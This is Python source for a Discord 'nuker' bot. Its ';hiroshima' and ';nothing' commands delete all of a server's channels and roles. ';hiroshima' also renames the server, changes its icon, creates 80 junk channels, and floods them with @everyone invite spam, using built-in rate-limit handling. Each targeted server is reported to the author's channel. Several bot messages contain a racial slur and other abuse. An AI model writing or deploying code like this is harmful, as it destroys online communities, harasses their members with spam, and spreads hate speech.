import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=";", intents=intents)
client.remove_command("help")

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559

# Whitelist for servers where bot is disabled
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT AWARE SPAMMER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=20):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.05
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=20)

async def spam_channel(channel, message, amount):
    """Spam a single channel with rate limit handling."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent = 0
    for i in range(min(amount, 200)):
        try:
            await rate_limiter.wait_if_needed()
            await channel.send(message)
            sent += 1
            await asyncio.sleep(random.uniform(0.05, 0.15))
        except discord.errors.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.response.headers.get('Retry-After', 1))
                print(f"[RATE LIMIT] Waiting {retry_after}s")
                await asyncio.sleep(retry_after + 0.5)
                try:
                    await channel.send(message)
                    sent += 1
                except:
                    pass
            else:
                break
        except Exception as e:
            print(f"[ERROR] {e}")
            break
    
    return sent

async def send_invite_spam(channels, amount=50):
    """Spam across all channels."""
    if not channels:
        return 0
    
    total_sent = 0
    tasks = []
    
    for channel in channels:
        tasks.append(asyncio.create_task(spam_channel(channel, SPAM_MESSAGE, amount)))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, int):
            total_sent += r
    
    print(f"[SPAM] Total sent: {total_sent} messages")
    return total_sent

# ============================================================
#  CHANNEL CREATION (OPTIMIZED — NO ROLES)
# ============================================================
async def create_channels_fast(guild, count=80, name="Fucked By blossom."):
    """Create channels as fast as possible without hitting rate limits."""
    channels = []
    created = 0
    failed = 0
    
    # Create in small batches with adaptive delays
    batch_size = 4
    delay_between_batches = 1.2
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        
        for j in range(batch_count):
            try:
                channel = await guild.create_text_channel(name)
                channels.append(channel)
                created += 1
                print(f"[CREATE] Created channel {created}/{count}")
                await asyncio.sleep(0.25)  # Short pause between each
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.response.headers.get('Retry-After', 2))
                    print(f"[RATE LIMIT] Waiting {retry_after}s...")
                    await asyncio.sleep(retry_after + 1)
                    try:
                        channel = await guild.create_text_channel(name)
                        channels.append(channel)
                        created += 1
                        print(f"[CREATE] Created channel {created}/{count} (after retry)")
                    except:
                        failed += 1
                else:
                    failed += 1
                    print(f"[ERROR] Failed to create channel: {e}")
            except Exception as e:
                failed += 1
                print(f"[ERROR] {e}")
        
        # Wait between batches
        if i + batch_count < count:
            await asyncio.sleep(delay_between_batches)
    
    print(f"[CREATE] Created {created} channels, {failed} failed")
    return channels

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# ============================================================
#  COMMANDS
# ============================================================
@client.command()
async def hiroshima(ctx):
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild
    print(f"[START] Hiroshima command executed in {guild.name} ({guild.id})")

    # --- CHANGE SERVER NAME & ICON ---
    try:
        if ctx.guild.me.guild_permissions.manage_guild:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed to 'fuck you blossom owns'")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await guild.edit(icon=image_data)
                        print("[SUCCESS] Server icon changed")
                    else:
                        print(f"[ERROR] Failed to download icon: {resp.status}")
        else:
            print("[ERROR] Missing manage_guild permission")
    except Exception as e:
        print(f"[ERROR] Server rename/icon: {e}")

    # --- REPORT CHANNEL ---
    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Hiroshima command used",
                description=f"A server has been targeted with `;hiroshima`.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server name", value=guild.name, inline=False)
            embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
            embed.add_field(name="Server ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.set_footer(text="Blossom Nuker report")
            await report_channel.send(embed=embed)
    except Exception as e:
        print(f"[ERROR] Report: {e}")

    # --- DELETE CHANNELS ---
    print("[DELETE] Starting channel deletion...")
    deleted_channels = 0
    for channel in list(guild.channels):
        try:
            await channel.delete()
            deleted_channels += 1
            if deleted_channels % 5 == 0:
                await asyncio.sleep(0.3)
        except Exception as e:
            print(f"[DELETE ERROR] {e}")
    print(f"[DELETE] Deleted {deleted_channels} channels")

    # --- DELETE ROLES (keep @everyone only) ---
    print("[DELETE] Starting role deletion...")
    deleted_roles = 0
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                deleted_roles += 1
                if deleted_roles % 5 == 0:
                    await asyncio.sleep(0.3)
            except Exception as e:
                print(f"[DELETE ERROR] {e}")
    print(f"[DELETE] Deleted {deleted_roles} roles")

    # --- CREATE CHANNELS (NO ROLES) ---
    print("[CREATE] Starting channel creation...")
    channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")
    print(f"[CREATE] Created {len(channels)} channels")

    # --- SPAM ---
    if channels:
        print(f"[SPAM] Starting spam on {len(channels)} channels...")
        await send_invite_spam(channels, amount=30)
    else:
        print("[SPAM] No channels to spam! Trying existing channels...")
        existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if existing:
            print(f"[SPAM] Using {len(existing)} existing channels")
            await send_invite_spam(existing, amount=30)
        else:
            print("[SPAM] No channels available for spam")

    print(f"[COMPLETE] Hiroshima finished on {guild.name}")

@client.command()
async def spaminvite(ctx, amount: int = 25):
    """Spam the invite link across all visible text channels."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
    await send_invite_spam(channels, amount=amount)
    await ctx.send("Invite spam finished.")

@client.command()
async def kicka(ctx, member: discord.Member = None):
    """Kick a specific member, or all bots if no member specified."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return

    if member is not None:
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("❌ You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            await ctx.send(f"✅ Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")
        return

    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission to use this command.")
        return

    target_bots = []
    for m in ctx.guild.members:
        if m.bot and m.id != ctx.guild.me.id:
            target_bots.append(m)

    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            kicked += 1
            await asyncio.sleep(0.3)
        except Exception:
            failed += 1

    if failed:
        await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")
    else:
        await ctx.send(f"✅ Kicked all {kicked} bot(s).")

@client.command()
async def blame(ctx, member: discord.Member = None):
    """Accuse a user of nuking the server."""
    target = member or ctx.author
    reasons = [
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!"
    ]
    reason = random.choice(reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed for nuking the server.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    """Display help menu."""
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    """Show bot credits."""
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command()
async def getbot(ctx):
    """Send a pre-built OAuth2 invite link for this bot."""
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    """Whitelist a server to prevent nuking."""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    """Delete everything in the server."""
    guild = ctx.guild
    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            pass
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass

# ============================================================
#  RUN THE BOT
# ============================================================
if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}[+] Starting Blossom Nuker (No Roles Mode)...")
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
